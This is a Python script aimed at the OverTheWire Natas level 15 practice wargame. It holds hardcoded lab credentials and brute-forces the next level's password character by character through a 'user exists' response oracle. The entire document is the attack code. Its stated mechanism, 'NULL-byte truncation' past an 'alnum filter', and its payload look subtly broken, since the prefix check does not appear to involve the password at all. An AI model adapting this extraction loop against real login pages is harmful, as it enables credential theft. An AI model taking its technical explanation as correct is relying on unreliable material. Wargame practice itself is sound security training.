#!/usr/bin/env python3
import requests
import string
import time

# -----------------------------
# CONFIG (Natas 15 only)
# -----------------------------
URL = "http://natas15.natas.labs.overthewire.org/index.php"
AUTH = ("natas15", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

TRUE_STRING = "This user exists."
CHARSET = string.ascii_letters + string.digits
MAX_LEN = 32
DELAY = 0.0


def check_prefix(prefix: str) -> bool:
    """
    Natas15 uses a restrictive alnum filter; the exploit is NULL-byte truncation.
    IMPORTANT: send a *real* NULL byte in the POST body (not %00 text).
    """
    body = f"username=natas16\x00{prefix}".encode("utf-8")

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(body)),
    }

    r = requests.post(
        URL,
        auth=AUTH,
        data=body,          # raw bytes => preserves \x00
        headers=headers,
        timeout=10,
    )

    return TRUE_STRING in r.text


def extract_password():
    extracted = ""
    print("[*] Starting Natas15 extraction...\n")

    for pos in range(1, MAX_LEN + 1):
        found = False

        for ch in CHARSET:
            test = extracted + ch

            if check_prefix(test):
                extracted += ch
                print(f"[+] Position {pos}: {ch}  ->  {extracted}")
                found = True
                break

            if DELAY:
                time.sleep(DELAY)

        if not found:
            print("[!] No further characters found. Stopping.")
            break

    print("\n[✓] Password recovered:")
    print(extracted)


if __name__ == "__main__":
    extract_password()
